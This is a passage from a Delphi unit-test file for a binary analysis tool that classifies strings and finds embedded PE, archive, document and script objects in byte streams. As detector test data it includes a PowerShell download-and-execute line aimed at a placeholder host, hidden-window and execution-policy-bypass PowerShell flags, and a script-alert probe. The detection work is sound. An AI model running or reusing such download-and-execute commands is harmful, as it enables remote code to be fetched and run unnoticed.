  CheckCategory('%APPDATA%\Microsoft\x.exe', scPath);
  CheckCategory('%TEMP%', scPath);
  CheckCategory('\Device\HarddiskVolume1', scPath);
  CheckCategory('\SystemRoot\System32\ntoskrnl.exe', scPath);
  CheckCategory('loadFrom="C:\Program Files\App"', scPath);
  // Служебные таблицы и мусор с «X:\» внутри — не пути.
  CheckCategory(':$;:0:4:8:<:@:D:H:L:P:T:X:\`:d:h:l:p:t:x:|:', scPlain);
  CheckCategory('90:@:H:P:X:\`:d:h:l:p:t:x:|:', scPlain);
  CheckCategory('%s%d items', scPlain);
  CheckCategory('ratio 3:4', scPlain);
  CheckCategory('\\n', scPlain);
end;

procedure TBinaryLabStringsTests.Classify_Domain;
begin
  CheckCategory('evil-domain.xyz', scDomain);
  CheckCategory('www.example.com', scDomain);
  CheckCategory('update.server.ru', scDomain);
  CheckCategory('abcdefgh.onion', scDomain);
  CheckCategory('EXAMPLE.COM', scDomain);
  // Имена файлов и пространства имён — не домены.
  CheckCategory('kernel32.dll', scPlain);
  CheckCategory('x.exe', scPlain);
  CheckCategory('readme.txt', scPlain);
  CheckCategory('System.IO', scPlain);
  CheckCategory('System.Net', scPlain);
  CheckCategory('two words.com', scPlain);
  CheckCategory('-bad-.com', scPlain);
  CheckCategory('123.456', scPlain);
end;

procedure TBinaryLabStringsTests.Classify_Base64AndPlain;
begin
  CheckCategory('TWluZUh1bnRlciB0ZXN0IHBheWxvYWQgMDEyMzQ1Njc4OSBmb3IgYmFzZTY0IGRldGVjdGlvbiE=', scBase64);
  CheckCategory('TWluZUh1bnRlciB0ZXN0IHBheWxvYWQgMDEyMzQ1Njc4OSBmb3IgYmFzZTY0IGRldGVjdGlvbiEh', scBase64);
  // Обычные слова, неверная длина или посторонние символы — не Base64.
  CheckCategory('abcdefghijklmnopqrstuvwxyzabcdefghijklmn', scPlain);
  CheckCategory('ThisIsANormalSentenceWithoutAnyDigitsAtAllOk', scPlain);
  CheckCategory('TWluZUh1bnRlciB0ZXN0IHBheWxvYWQgMDEyMzQ1Njc4OSBmb3IgYmFzZTY0IGRldGVjdGlvbiE', scPlain);
  CheckCategory('TWluZUh1bnRlciB0ZXN0IHBheWxv=WQgMDEyMzQ1Njc4OSBmb3IgYmFzZTY0IGRldGVjdGlvbiE=', scPlain);
  CheckCategory('Hello world', scPlain);
  CheckCategory('', scPlain);
end;

{ TBinaryLabEmbeddedTests }

function Find(const AData: TBytes; const AOptions: TMHBinaryLabOptions): TArray<TMHEmbeddedObject>;
begin
  Result := MHFindEmbedded(Src(AData), AOptions, nil, nil);
end;

procedure TBinaryLabEmbeddedTests.Embedded_PeInsideData;
var
  LPe: TBytes;
  LFound: TArray<TMHEmbeddedObject>;
begin
  LPe := TestMinimalPe;
  LFound := Find(TestConcat([TestRandomBytes(5000, 11), LPe, TestRandomBytes(3000, 12)]), Options);
  Assert.AreEqual(1, Integer(Length(LFound)));
  Assert.AreEqual<Int64>(5000, LFound[0].Offset);
  Assert.AreEqual<Int64>(Length(LPe), LFound[0].Size, 'Размер — по таблице секций');
  Assert.AreEqual(Ord(bkPE), Ord(LFound[0].Kind));
  Assert.IsTrue(LFound[0].Description.Contains('x64'), LFound[0].Description);
  Assert.AreEqual('', LFound[0].Location);
end;

procedure TBinaryLabEmbeddedTests.Embedded_ArchivesAndDocuments;
var
  LData: TBytes;
  LFound: TArray<TMHEmbeddedObject>;
  LZip, LPdf, LGzip, LCab, LAfterCab: Integer;
begin
  LData := TestRandomBytes(1000, 21);
  LZip := Length(LData);
  LData := TestConcat([LData, TestBytes([$50, $4B, $03, $04, $14, 0, 0, 0, 8, 0]), TestRandomBytes(500, 22)]);
  LPdf := Length(LData);
  LData := TestConcat([LData, TestAscii('%PDF-1.7'), TestRandomBytes(500, 23)]);
  LGzip := Length(LData);
  LData := TestConcat([LData, TestBytes([$1F, $8B, $08, 0]), TestRandomBytes(500, 24)]);
  LCab := Length(LData);
  // CAB размером 200 байт; внутри — сигнатура PDF, которая не должна быть найдена.
  LData := TestConcat([LData, TestAscii('MSCF'), TestBytes([0, 0, 0, 0, 200, 0, 0, 0]), Zeros(100),
    TestAscii('%PDF-1.4'), Zeros(200 - 12 - 100 - 8)]);
  LAfterCab := Length(LData);
  LData := TestConcat([LData, TestBytes([$D0, $CF, $11, $E0, $A1, $B1, $1A, $E1]), TestRandomBytes(300, 25)]);
  LFound := Find(LData, Options);
  Assert.AreEqual(5, Integer(Length(LFound)));
  Assert.AreEqual(Ord(bkZip), Ord(LFound[0].Kind));
  Assert.AreEqual<Int64>(LZip, LFound[0].Offset);
  Assert.AreEqual<Int64>(-1, LFound[0].Size, 'Размер ZIP неизвестен');
  Assert.AreEqual(Ord(bkPdf), Ord(LFound[1].Kind));
  Assert.AreEqual<Int64>(LPdf, LFound[1].Offset);
  Assert.AreEqual(Ord(bkGzip), Ord(LFound[2].Kind));
  Assert.AreEqual<Int64>(LGzip, LFound[2].Offset);
  Assert.AreEqual(Ord(bkCab), Ord(LFound[3].Kind));
  Assert.AreEqual<Int64>(LCab, LFound[3].Offset);
  Assert.AreEqual<Int64>(200, LFound[3].Size);
  Assert.AreEqual(Ord(bkOle), Ord(LFound[4].Kind), 'После CAB поиск продолжается');
  Assert.AreEqual<Int64>(LAfterCab, LFound[4].Offset);
end;

procedure TBinaryLabEmbeddedTests.Embedded_RandomData_NoFalsePositives;
begin
  Assert.AreEqual(0, Integer(Length(Find(TestRandomBytes(256 * 1024, 777), Options))));
  Assert.AreEqual(0, Integer(Length(Find(TestRandomBytes(2 * MB, 4242), Options))), 'Случайные 2 МБ');
  Assert.AreEqual(0, Integer(Length(Find(TestCodeBytes(512 * 1024), Options))), 'Машинный код');
  Assert.AreEqual(0, Integer(Length(Find(nil, Options))), 'Пустой источник');
  Assert.AreEqual(0, Integer(Length(MHFindEmbedded(nil, Options, nil, nil))), 'Источник nil');
  Assert.AreEqual(0, Integer(Length(Find(TestBytes([$4D]), Options))), 'Один байт');
end;

procedure TBinaryLabEmbeddedTests.Embedded_WeakSignaturesInText_Ignored;
var
  LData: TBytes;
begin
  LData := TestConcat([TestAscii('Header: MZ is text, PK and Rar! are words, 7z too, GIF8 not a GIF, '),
    TestAscii('MZ'), TestBytes([$90, 0, 3, 0]), TestRandomBytes(200, 31), TestBytes([$FF, $D8, $FF, 0]),
    TestBytes([$50, $4B, $03, $04, $FF, $FF, 0, 0, $77, 0]), TestAscii('MSCF'), TestBytes([1, 0, 0, 0, 200, 0, 0, 0]),
    TestRandomBytes(100, 32)]);
  Assert.AreEqual(0, Integer(Length(Find(LData, Options))),
    'MZ без PE, JPEG без маркера, ZIP с неверными полями, CAB с ненулевым полем — не объекты');
end;

procedure TBinaryLabEmbeddedTests.Embedded_OffsetZero_NotReported;
begin
  Assert.AreEqual(0, Integer(Length(Find(TestMinimalPe, Options))), 'Сам файл — не вложение');
  Assert.AreEqual(0, Integer(Length(Find(TestConcat([TestBytes([$1F, $8B, $08, 0]), TestRandomBytes(100)]), Options))));
  Assert.AreEqual(0, Integer(Length(Find(TestConcat([TestAscii('@echo off'), TestRandomBytes(100)]), Options))));
  Assert.AreEqual(1, Integer(Length(Find(TestConcat([TestBytes([0]), TestAscii('%PDF-1.5'), Zeros(10)]), Options))),
    'Смещение 1 уже проверяется');
end;

procedure TBinaryLabEmbeddedTests.Embedded_NestedObjectSkipped;
var
  LBuilder: TTestPeBuilder;
  LPe: TBytes;
  LFound: TArray<TMHEmbeddedObject>;
  LInner: Cardinal;
begin
  LBuilder := TTestPeBuilder.Create;
  try
    LBuilder.AddSection('.text', TestCodeBytes(1024), SCN_TEXT);
    LBuilder.AddSection('.rdata', TestConcat([Zeros(16), TestAscii('%PDF-1.4 embedded'), Zeros(64)]), SCN_RDATA);
    LPe := LBuilder.Build;
    LInner := LBuilder.SectionRawOffset('.rdata') + 16;
  finally
    LBuilder.Free;
  end;
  // PE внутри данных: вложенный PDF — часть этого PE, отдельно не показывается.
  LFound := Find(TestConcat([TestRandomBytes(4000, 41), LPe, TestAscii('%PDF-1.6'), Zeros(10)]), Options);
  Assert.AreEqual(2, Integer(Length(LFound)));
  Assert.AreEqual(Ord(bkPE), Ord(LFound[0].Kind));
  Assert.AreEqual<Int64>(4000, LFound[0].Offset);
  Assert.AreEqual(Ord(bkPdf), Ord(LFound[1].Kind), 'Объект сразу после PE найден');
  Assert.AreEqual<Int64>(4000 + Length(LPe), LFound[1].Offset);
  // Сам файл — PE: его содержимое просматривается, PDF в секции найден.
  LFound := Find(LPe, Options);
  Assert.AreEqual(1, Integer(Length(LFound)));
  Assert.AreEqual(Ord(bkPdf), Ord(LFound[0].Kind));
  Assert.AreEqual<Int64>(LInner, LFound[0].Offset);
end;

procedure TBinaryLabEmbeddedTests.Embedded_BogusSize_DoesNotHideRest;
var
  LData: TBytes;
  LFound: TArray<TMHEmbeddedObject>;
begin
  // CAB заявляет размер больше файла — пропуск не делается, PDF дальше найден.
  LData := TestConcat([TestRandomBytes(100, 51), TestAscii('MSCF'), TestBytes([0, 0, 0, 0, $FF, $FF, $FF, $7F]),
    Zeros(50), TestAscii('%PDF-1.3'), Zeros(10)]);
  LFound := Find(LData, Options);
  Assert.AreEqual(2, Integer(Length(LFound)));
  Assert.AreEqual(Ord(bkCab), Ord(LFound[0].Kind));
  Assert.AreEqual<Int64>($7FFFFFFF, LFound[0].Size, 'Размер — как в заголовке');
  Assert.AreEqual(Ord(bkPdf), Ord(LFound[1].Kind));
end;

procedure TBinaryLabEmbeddedTests.Embedded_MaxEmbeddedLimit;
var
  LParts: TArray<TBytes>;
  LOptions: TMHBinaryLabOptions;
  LFound: TArray<TMHEmbeddedObject>;
  I: Integer;
begin
  LParts := [Zeros(10)];
  for I := 1 to 10 do
    LParts := LParts + [TestBytes([$1F, $8B, $08, 0]), Zeros(100)];
  LOptions := Options;
  LOptions.MaxEmbedded := 3;
  LFound := Find(TestConcat(LParts), LOptions);
  Assert.AreEqual(3, Integer(Length(LFound)));
  for I := 0 to 2 do
    Assert.AreEqual<Int64>(10 + I * 104, LFound[I].Offset, 'Первые по смещению');
  LOptions.MaxEmbedded := 0;
  Assert.AreEqual(0, Integer(Length(Find(TestConcat(LParts), LOptions))));
  Assert.AreEqual(10, Integer(Length(Find(TestConcat(LParts), Options))));
end;

procedure TBinaryLabEmbeddedTests.Embedded_ScriptFragments_AndWindow;
var
  LData: TBytes;
  LFound: TArray<TMHEmbeddedObject>;
  LFirst, LSecond, LThird: Integer;
begin
  LData := TestRandomBytes(1000, 61);
  LFirst := Length(LData);
  LData := TestConcat([LData, TestAscii('@ECHO OFF'#13#10'start evil.exe'), TestRandomBytes(100, 62),
    TestAscii('powershell -nop -w hidden'), TestRandomBytes(5000, 63)]);
  LSecond := Length(LData);
  LData := TestConcat([LData, TestAscii('IEX(New-Object Net.WebClient).DownloadString(''http://x.example/a'') ' +
    StringOfChar('#', 80)), TestRandomBytes(100, 64)]);
  LThird := Length(LData);
  LData := TestConcat([LData, TestRandomBytes(4000, 65), TestAscii('<SCRIPT>alert(1)</script>'), Zeros(10)]);
  LThird := LThird + 4000;
  LFound := Find(LData, Options);
  Assert.AreEqual(3, Integer(Length(LFound)), 'Второй маркер в том же окне 4 КБ не показывается');
  Assert.AreEqual(Ord(bkScript), Ord(LFound[0].Kind));
  Assert.AreEqual<Int64>(LFirst, LFound[0].Offset);
  Assert.AreEqual<Int64>(-1, LFound[0].Size);
  Assert.IsTrue(LFound[0].Description.Contains('@ECHO OFF'), LFound[0].Description);
  Assert.IsFalse(LFound[0].Description.Contains('start'), 'Описание — только строка маркера');
  Assert.AreEqual<Int64>(LSecond, LFound[1].Offset, 'Без учёта регистра');
  Assert.IsTrue(LFound[1].Description.Contains('IEX(New-Object'), LFound[1].Description);
  Assert.IsFalse(LFound[1].Description.Contains(StringOfChar('#', 80)), 'Не длиннее 60 символов строки');
  Assert.AreEqual<Int64>(LThird, LFound[2].Offset);
end;

procedure TBinaryLabEmbeddedTests.Embedded_ChunkBoundaries;
var
  LData: TBytes;
  LPe: TBytes;
  LFound: TArray<TMHEmbeddedObject>;
  LGzipAt, LScriptAt, LPeAt, LPdfAt: Integer;
begin
  // Блок чтения 1 МБ: GZIP пересекает первую границу, маркер сценария — вторую,
  // PE пересекает третью, а после него — PDF (поиск продолжается за пропуском).
  LPe := TestMinimalPe;
  LData := Zeros(4 * MB);
  LGzipAt := MB - 2;
  LScriptAt := 2 * MB - 10;
  LPeAt := 3 * MB - 100;
  LPdfAt := LPeAt + Length(LPe) + 7;
  Put(LData, LGzipAt, TestBytes([$1F, $8B, $08, 0]));
  Put(LData, LScriptAt, TestAscii('Set-ExecutionPolicy Bypass'));
  Put(LData, LPeAt, LPe);
  Put(LData, LPdfAt, TestAscii('%PDF-1.7'));
  LFound := Find(LData, Options);
  Assert.AreEqual(4, Integer(Length(LFound)), 'Каждый объект — ровно один раз');
  Assert.AreEqual(Ord(bkGzip), Ord(LFound[0].Kind));
  Assert.AreEqual<Int64>(LGzipAt, LFound[0].Offset);
  Assert.AreEqual(Ord(bkScript), Ord(LFound[1].Kind));
  Assert.AreEqual<Int64>(LScriptAt, LFound[1].Offset);
  Assert.AreEqual(Ord(bkPE), Ord(LFound[2].Kind));
  Assert.AreEqual<Int64>(LPeAt, LFound[2].Offset);
  Assert.AreEqual(Ord(bkPdf), Ord(LFound[3].Kind));
  Assert.AreEqual<Int64>(LPdfAt, LFound[3].Offset);
end;

procedure TBinaryLabEmbeddedTests.Embedded_LocateAndMaxScanBytes;
var
  LData: TBytes;
  LOptions: TMHBinaryLabOptions;
  LFound: TArray<TMHEmbeddedObject>;
begin
  LData := Zeros(10000);
  Put(LData, 1000, TestAscii('%PDF-1.7'));
  Put(LData, 6000, TestBytes([$1F, $8B, $08, 0]));
  LFound := MHFindEmbedded(Src(LData), Options,
    function(AOffset: Int64): string
    begin
      Result := LocateText(AOffset);
    end, nil);
  Assert.AreEqual(2, Integer(Length(LFound)));
  Assert.AreEqual('смещение 1000', LFound[0].Location, 'Место — по ALocate');
  Assert.AreEqual('смещение 6000', LFound[1].Location);
  LOptions := Options;
  LOptions.MaxScanBytes := 4096;
  LFound := Find(LData, LOptions);
  Assert.AreEqual(1, Integer(Length(LFound)), 'За лимитом чтения не ищется');
  Assert.AreEqual<Int64>(1000, LFound[0].Offset);
end;

procedure TBinaryLabEmbeddedTests.Embedded_Cancel_Raises;
var
  LData: TBytes;
  LCalls: Integer;
begin
  LData := Zeros(3 * MB);
  LCalls := 0;
  Assert.WillRaise(
    procedure
    begin
      MHFindEmbedded(Src(LData), Options, nil,
        function: Boolean
        begin
          Inc(LCalls);
          Result := LCalls >= 2;
        end);
    end, EMHBinaryLabCancelled);
  Assert.AreEqual(2, LCalls);
end;

initialization
  TDUnitX.RegisterTestFixture(TBinaryLabEntropyTests);
  TDUnitX.RegisterTestFixture(TBinaryLabStringsTests);
  TDUnitX.RegisterTestFixture(TBinaryLabEmbeddedTests);

end.
